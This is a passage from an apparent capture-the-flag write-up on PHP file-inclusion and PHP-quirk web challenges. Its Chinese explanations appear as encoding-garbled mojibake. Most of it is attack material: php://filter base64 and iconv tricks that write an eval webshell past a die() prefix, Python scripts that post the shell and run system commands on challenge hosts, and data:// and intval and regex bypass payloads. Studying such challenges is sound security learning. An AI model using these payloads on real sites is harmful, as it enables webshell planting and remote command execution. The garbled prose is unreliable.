die(&#x27;Â§ß‰Ω¨Âà´ÁßÄ‰∫Ü&#x27;);?&gt;&quot;</span>.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÂàÜÊûê‰∏Ä‰∏ãÊ∫êÁ†ÅÔºåget‰º†ÂÖ•fileÔºåpost‰º†ÂÖ•contentÔºå‰ΩÜ<code>$content</code>Âú®ÂºÄÂ§¥Â¢ûÂä†‰∫ÜdieÂáΩÊï∞ÔºåÂç≥‰ΩøÊàë‰ª¨ÂÜôÂÖ•‰∏ÄÂè•ËØù‰πü‰ºöÂÖàdieÔºåÂØºËá¥Êó†Ê≥ïÊâßË°åÔºõÂπ∂‰∏îËøòÂØπ<code>file</code>ËøõË°å‰∫ÜurlËß£Á†Å<br>Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî®base64ÁöÑÊñπÂºèÂÜôÂÖ•Êñá‰ª∂ÂÜçËøõË°ådecodeÔºåbase64ÁºñÁ†ÅÂè™ÂåÖÂê´64‰∏™ÂèØÊâìÂç∞Â≠óÁ¨¶ÔºåËÄåphpËß£Á†Åbase64Êó∂ÈÅáÂà∞‰∏çÂú®ÂÖ∂‰∏≠ÁöÑÂ≠óÁ¨¶Ôºå‰ºöÂøΩÁï•ÊéâÔºåÂ∞ÜÂêàÊ≥ïÂ≠óÁ¨¶ËøõË°åÁªÑÂêàÂèòÊàê‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ËøõË°åËß£Á†ÅÔºåÊâÄ‰ª•<code>&lt;?php die('Â§ß‰Ω¨Âà´ÁßÄ‰∫Ü');?&gt;</code>ÂØπÂÖ∂Ëß£Á†ÅÂêéÔºåÂè™Êúâ<code>phpdie</code>ÂÖ≠‰∏™Â≠óÁ¨¶ÁªÑÊàêÂ≠óÁ¨¶‰∏≤ËøõË°åËß£Á†ÅÔºåÊÄùË∑ØÂ∑≤ÁªèÂæàÊ∏ÖÊô∞‰∫ÜÔºå‰∏ãÈù¢ËÆ≤ËÆ≤ÊÄé‰πàÂÅö</p><blockquote><p>Á¨¨‰∏ÄÔºåget‰º†ÂèÇfileÂÜôÂÖ•Êñá‰ª∂Âπ∂‰∏îËøõË°åbase64Ëß£Á†ÅÔºåÂç≥<br>?file=php://filter/write=convert.base64-decode/resource=datast.php<br>Âõ†‰∏∫Ê∫êÁ†Å‰∏≠Êúâ‰∏ÄÊ¨°urldecodeÔºåÊâÄ‰ª•Êàë‰ª¨ÈúÄË¶ÅÂØπÂÖ∂ËøõË°å‰∏§Ê¨°urlÁºñÁ†Å<br>%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%36%34%25%36%31%25%37%34%25%36%31%25%37%33%25%37%34%25%32%45%25%37%30%25%36%38%25%37%30</p><p>Á¨¨‰∫åÔºåpost‰º†ÂèÇcontent‰∏∫base64ÁºñÁ†ÅÂêéÁöÑ‰∏ÄÂè•ËØùÊú®È©¨Ôºå‰ΩÜÊ≥®ÊÑèÁöÑÊòØÂâçÈù¢Ââ©‰∏ãphpdieÔºå‰∏ÄÂÖ±6‰∏™Â≠óÁ¨¶ÔºåÊâÄ‰ª•ÈúÄË¶ÅÂÜçÂä†2‰∏™Â≠óÁ¨¶Âèò8‰∏™<br>Âõ†‰∏∫base64ÁÆóÊ≥ïËß£Á†ÅÊó∂ÊòØ4‰∏™byte‰∏ÄÁªÑ<br>content=nbPD9waHAgQGV2YWwoJF9QT1NUW3Bhc3NdKTs/Pg==</p></blockquote><p>postÂèëÈÄÅËØ∑Ê±ÇÂêéËÆøÈóÆdotast.phpÂèëÁé∞‰∏ÄÂè•ËØùÊú®È©¨Â∑≤ÁªèÂÜôÂÖ•ÔºåÂèØ‰ª•ÊâßË°åÂëΩ‰ª§„ÄÇÊ≠•È™§Ëøá‰∫éÁπÅÁêêÔºåÊàëÂÜô‰∏Ä‰∏™ËÑöÊú¨Êù•ÂÆåÊàê</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/21 12:29</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://67365af2-c5a6-4b3c-8900-25c85ed1d8cc.chall.ctf.show:8080/&quot;</span></span><br><span class="line"><span class="comment">#ÁªèËøá‰∏§Ê¨°urlÁºñÁ†ÅÁöÑphp://filter/write=convert.base64-decode/resource=dotast.php</span></span><br><span class="line">get_data = <span class="string">&quot;%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%36%34%25%36%31%25%37%34%25%36%31%25%37%33%25%37%34%25%32%45%25%37%30%25%36%38%25%37%30&quot;</span></span><br><span class="line">get_url = url + <span class="string">&quot;?file=&quot;</span> + get_data</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27;nbPD9waHAgQGV2YWwoJF9QT1NUW3Bhc3NdKTs/Pg==&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url=get_url, data=data)</span><br><span class="line">shell_url = url + <span class="string">&quot;dotast.php&quot;</span></span><br><span class="line">test = requests.get(shell_url)</span><br><span class="line"><span class="keyword">if</span>(test.status_code == <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">&quot;[*]getshellÊàêÂäü&quot;</span>)</span><br><span class="line">    shell_data = &#123;</span><br><span class="line">        <span class="string">&#x27;pass&#x27;</span>: <span class="string">&#x27;system(&quot;cat fl0g.php&quot;);&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = requests.post(url=shell_url, data=shell_data)</span><br><span class="line">    print(result.text)</span><br></pre></td></tr></table></figure><p>ËøêË°åÂêéÂç≥ÂèØÂæóÂà∞flag</p><h3 id="web88"><a class="header-anchor" href="#web88">¬∂</a>web88</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, $file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÂÄíÊòØÂèòÂæóÁÆÄÂçï‰∫ÜÔºåËøáÊª§‰∫ÜphpÔºå‰ΩÜÊ≤°ËøáÊª§dataÔºåÊâÄ‰ª•‰ΩøÁî®data‰º™ÂçèËÆÆÔºå‰ΩÜÂõ†‰∏∫ËøáÊª§‰∫ÜphpÊâÄ‰ª•Êàë‰ª¨‰ΩøÁî®base64ÁºñÁ†Å‰∏Ä‰∏ã<br>payloadÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTsgPz4</span><br></pre></td></tr></table></figure><h3 id="web116"><a class="header-anchor" href="#web116">¬∂</a>web116</h3><p>È¢òÁõÆÊèêÁ§∫ÊòØlfiÔºå‰πüÂ∞±ÊòØphpÊú¨Âú∞Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûÔºåÊâìÂºÄÈ¢òÁõÆÔºåÊòØ‰∏Ä‰∏™ËßÜÈ¢ëÔºåÊòØÊ∏ØÁâáÁîµÂΩ±ÂêàÈõÜÁöÑÊ∑∑Ââ™ÔºåÈ•∂ÊúâÂÖ¥Ë∂£ÁöÑÁúãÂÆå‰∫ÜüòÜ<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web116/2%7D%40E%5DTLC4S_U0C8%28UEZ%25UWQ.png" alt=""><br>Áõ¥Êé•ËØï‰∫Ü‰∏Ä‰∏ãfileÂèÇÊï∞ÂåÖÂê´Ë∑ØÂæÑÔºåÂ∞±Âá∫Êù•‰∫ÜÊ∫êÁ†Å<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web116/Y%40VCXO2K%2556I%7BHVG%5D67F3%24B.png" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|data|input|rot13|base64|string|log|sess/i&#x27;</span>,$x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])?$_GET[<span class="string">&#x27;file&#x27;</span>]:<span class="string">&quot;5.mp4&quot;</span>;</span><br><span class="line">filter($file);</span><br><span class="line">header(<span class="string">&#x27;Content-Type: video/mp4&#x27;</span>);</span><br><span class="line">header(<span class="string">&quot;Content-Length: <span class="subst">$file</span>&quot;</span>);</span><br><span class="line">readfile($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Áõ¥Êé•ÂåÖÂê´flagÂ∞±Âá∫Êù•‰∫Ü<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web116/9B%40%5B8%246KWLQ%60%5B%28WD~%5DU8%7D7A.png" alt=""></p><h3 id="web117"><a class="header-anchor" href="#web117">¬∂</a>web117</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,$x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">$contents=$_POST[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line">filter($file);</span><br><span class="line">file_put_contents($file, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.$contents); </span><br></pre></td></tr></table></figure><p>ËøôÈ¢òÂíåÂâçÈù¢ÁöÑÊúâÁÇπÁ±ª‰ººÔºå‰πüÊòØÁªïËøácontentsÂâçÈù¢ÁöÑÊ≠ª‰∫°‰ª£Á†ÅÔºåÂè™ÊòØÊää‰∏Ä‰∫õÂèØÂà©Áî®ÁöÑÂçèËÆÆÂíåÁºñÁ†ÅÁªôban‰∫ÜÔºå‰ΩÜËøòÂèØ‰ª•Âà©Áî®ÂÖ∂ÂÆÉÁºñÁ†ÅÂô®ËøõË°åÁªïËøá</p><blockquote><p>convert.iconv.Ôºö‰∏ÄÁßçËøáÊª§Âô®ÔºåÂíå‰ΩøÁî®iconv()ÂáΩÊï∞Â§ÑÁêÜÊµÅÊï∞ÊçÆÊúâÁ≠âÂêå‰ΩúÁî®<br><code>iconv ( string $in_charset , string $out_charset , string $str )</code>ÔºöÂ∞ÜÂ≠óÁ¨¶‰∏≤<code>$str</code>‰ªé<code>in_charset</code>ÁºñÁ†ÅËΩ¨Êç¢Âà∞<code>$out_charset</code><br>ËøôÈáåÂºïÂÖ•usc-2ÁöÑÊ¶ÇÂøµÔºå‰ΩúÁî®ÊòØÂØπÁõÆÊ†áÂ≠óÁ¨¶‰∏≤ÊØè‰∏§‰ΩçËøõË°å‰∏ÄÂèçËΩ¨ÔºåÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØÔºåÂõ†‰∏∫ÊòØ‰∏§‰ΩçÊâÄ‰ª•Â≠óÁ¨¶‰∏≤ÈúÄË¶Å‰øùÊåÅÂú®ÂÅ∂Êï∞‰Ωç‰∏ä</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$result = iconv(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="string">&#x27;&lt;?php @eval($_POST[dotast]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ÁªèËøá‰∏ÄÊ¨°ÂèçËΩ¨:&quot;</span>.$result.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ÁªèËøáÁ¨¨‰∫åÊ¨°ÂèçËΩ¨:&quot;</span>.iconv(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, $result);</span><br><span class="line"></span><br><span class="line"><span class="comment">//ËæìÂá∫ÁªìÊûúÂ¶Ç‰∏ãÔºö</span></span><br><span class="line"><span class="comment">//ÁªèËøá‰∏ÄÊ¨°ÂèçËΩ¨:?&lt;hp pe@av(l_$OPTSd[tosa]t;)&gt;?</span></span><br><span class="line"><span class="comment">//ÁªèËøáÁ¨¨‰∫åÊ¨°ÂèçËΩ¨:<span class="meta">&lt;?php</span> @eval($_POST[dotast]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>ÂèØ‰ª•ÁúãÂà∞ÔºåÁªèËøá‰∏§Ê¨°ÂèçËΩ¨‰πãÂêé‰ª£Á†ÅÂèàÁªÑË£ÖÂõûÊù•ÔºåÊÄùË∑ØÂ∞±ÊòØÁî®ÁªèËøá‰∏ÄÊ¨°ÂèçËΩ¨ÂêéÁöÑwebshellÂíåÊ≠ª‰∫°‰ª£Á†Å<code>&lt;?php die();?&gt;</code>‰∏ÄËµ∑ÁªÑÂêà‰πãÂêéÔºåÁªèËøáÁ¨¨‰∫åÊ¨°ÂèçËΩ¨Êàë‰ª¨ÁöÑwebshellÂ∞±ÊÅ¢Â§çÊ≠£Â∏∏‰∫ÜÔºåËÄåÊ≠ª‰∫°‰ª£Á†Å‰ºöË¢´ÂèçËΩ¨Êâì‰π±‰∏çËÉΩÊâßË°å<br>ÊâÄ‰ª•payload‰πüÂ∞±Âá∫Êù•‰∫ÜÔºåÊääÂâçÈù¢ÁöÑËÑöÊú¨Êîπ‰∏Ä‰∏ãÂç≥ÂèØ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/21 12:29</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8a412388-9727-4ea0-8b0d-1f144f2d1a87.chall.ctf.show:8080/&quot;</span></span><br><span class="line">get_data = <span class="string">&quot;php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=dotast.php&quot;</span></span><br><span class="line">get_url = url + <span class="string">&quot;?file=&quot;</span> + get_data</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;contents&#x27;</span>: <span class="string">&#x27;?&lt;hp pe@av(l_$OPTSd[tosa]t;)&gt;?&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url=get_url, data=data)</span><br><span class="line">shell_url = url + <span class="string">&quot;dotast.php&quot;</span></span><br><span class="line">test = requests.get(shell_url)</span><br><span class="line"><span class="keyword">if</span>(test.status_code == <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">&quot;[*]getshellÊàêÂäü&quot;</span>)</span><br><span class="line">    shell_data = &#123;</span><br><span class="line">        <span class="string">&#x27;dotast&#x27;</span>: <span class="string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = requests.post(url=shell_url, data=shell_data)</span><br><span class="line">    print(result.text)</span><br></pre></td></tr></table></figure><p>ËøêË°åÂêéÂæóÂà∞flag</p><h2 id="phpÁâπÊÄß-89-115-123-125-150"><a class="header-anchor" href="#phpÁâπÊÄß-89-115-123-125-150">¬∂</a>phpÁâπÊÄß(89-115&amp;123&amp;125-150)</h2><h3 id="web89"><a class="header-anchor" href="#web89">¬∂</a>web89</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>intval()</strong> ÂáΩÊï∞Áî®‰∫éËé∑ÂèñÂèòÈáèÁöÑÊï¥Êï∞ÂÄº„ÄÇ</p><p><strong>intval()</strong> ÂáΩÊï∞ÈÄöËøá‰ΩøÁî®ÊåáÂÆöÁöÑËøõÂà∂ base ËΩ¨Êç¢ÔºàÈªòËÆ§ÊòØÂçÅËøõÂà∂ÔºâÔºåËøîÂõûÂèòÈáè var ÁöÑ integer Êï∞ÂÄº„ÄÇ intval() ‰∏çËÉΩÁî®‰∫é objectÔºåÂê¶Âàô‰ºö‰∫ßÁîü E_NOTICE ÈîôËØØÂπ∂ËøîÂõû 1„ÄÇ</p></blockquote><p>È¶ñÂÖàÁ¨¨‰∏Ä‰∏™ifÂà§Êñ≠ÊúâÊó†ÂèÇÊï∞numÔºåÁ¨¨‰∫å‰∏™ifÊ≠£ÂàôÂåπÈÖçÊúâÊ≤°ÊúâÊï∞Â≠óÔºåÁ¨¨‰∏â‰∏™ifÂ¶ÇÊûúËÉΩ‰∏∫1ÁöÑËØùÔºåÂ∞±ÂèØÊâßË°åifÈáåÁöÑËØ≠Âè•ÔºåËÄåintvalÂáΩÊï∞Áî®‰∫éobjectÊó∂‰ºöÂèëÁîüÈîôËØØÂπ∂ËøîÂõû1ÔºåÊâÄ‰ª•payload‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]&#x3D;1</span><br></pre></td></tr></table></figure><h3 id="web90"><a class="header-anchor" href="#web90">¬∂</a>web90</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ÁªßÁª≠ËÄÉÂØüintvalÁöÑ‰ΩøÁî®ÔºåÂ§öË°•ÂÖÖÁÇπÁü•ËØÜ</p><blockquote><p>int intval ( mixed $var [, int $base = 10 ] )</p><p>Â¶ÇÊûú base ÊòØ 0ÔºåÈÄöËøáÊ£ÄÊµã var ÁöÑÊ†ºÂºèÊù•ÂÜ≥ÂÆö‰ΩøÁî®ÁöÑËøõÂà∂Ôºö</p><ul><li>Â¶ÇÊûúÂ≠óÁ¨¶‰∏≤ÂåÖÊã¨‰∫Ü ‚Äú0x‚Äù (Êàñ ‚Äú0X‚Äù) ÁöÑÂâçÁºÄÔºå‰ΩøÁî® 16 ËøõÂà∂ (hex)ÔºõÂê¶ÂàôÔºå</li><li>Â¶ÇÊûúÂ≠óÁ¨¶‰∏≤‰ª• ‚Äú0‚Äù ÂºÄÂßãÔºå‰ΩøÁî® 8 ËøõÂà∂(octal)ÔºõÂê¶ÂàôÔºå</li><li>Â∞Ü‰ΩøÁî® 10 ËøõÂà∂ (decimal)„ÄÇ</li></ul></blockquote><p>ÊâÄ‰ª•Êää4476ËΩ¨Êç¢Êàê16ËøõÂà∂Ôºåpayload‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;0x117c </span><br></pre></td></tr></table></figure><h3 id="web91"><a class="header-anchor" href="#web91">¬∂</a>web91</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">$a=$_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>, $a))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/i&#x27;</span>, $a))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>Á¨¨‰∏Ä‰∏™ifÈúÄË¶ÅÂåπÈÖçÂà∞phpÔºåËÄåÁ¨¨‰∫å‰∏™ifÂ¶ÇÊûúÂåπÈÖçÂà∞phpÂ∞±‰ºöËæìÂá∫hackerÔºåÁªïËøáÈúÄË¶Å‰∏çËÆ©ÂÆÉÂåπÈÖçÂà∞ÔºåËøôÈáåÊúâ‰∏Ä‰∏™Ê≠£ÂàôÂåπÈÖçÁöÑÁü•ËØÜÁÇπ</p><blockquote><p>/iË°®Á§∫ÂåπÈÖçÂ§ßÂ∞èÂÜô<br>Â≠óÁ¨¶ ^ Âíå $ ÂêåÊó∂‰ΩøÁî®Êó∂ÔºåË°®Á§∫Á≤æÁ°ÆÂåπÈÖçÔºåÈúÄË¶ÅÂåπÈÖç‰ª•phpÂºÄÂ§¥Âíå‰ª•phpÁªìÂ∞æ<br>/m Â§öË°åÂåπÈÖç Ëã•Â≠òÂú®Êç¢Ë°å\nÂπ∂‰∏îÊúâÂºÄÂßã^ÊàñÁªìÊùü$Á¨¶ÁöÑÊÉÖÂÜµ‰∏ãÔºåÂ∞Ü‰ª•Êç¢Ë°å‰∏∫ÂàÜÈöîÁ¨¶ÔºåÈÄêË°åËøõË°åÂåπÈÖç<br>‰ΩÜÊòØÂΩìÂá∫Áé∞Êç¢Ë°åÁ¨¶ <code>%0a</code>ÁöÑÊó∂ÂÄôÔºå$cmdÁöÑÂÄº‰ºöË¢´ÂΩìÂÅö‰∏§Ë°åÂ§ÑÁêÜÔºåËÄåÊ≠§Êó∂Á¨¨‰∫å‰∏™ifÊ≠£ÂàôÂåπÈÖç‰∏çÁ¨¶Âêà‰ª•phpÂºÄÂ§¥Âíå‰ª•phpÁªìÂ∞æ</p></blockquote><p>ÊâÄ‰ª•paylaod‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;%0aphp</span><br><span class="line">ÊàñËÄÖ</span><br><span class="line">?cmd&#x3D;php%0a%0a</span><br></pre></td></tr></table></figure><h3 id="web92"><a class="header-anchor" href="#web92">¬∂</a>web92</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span 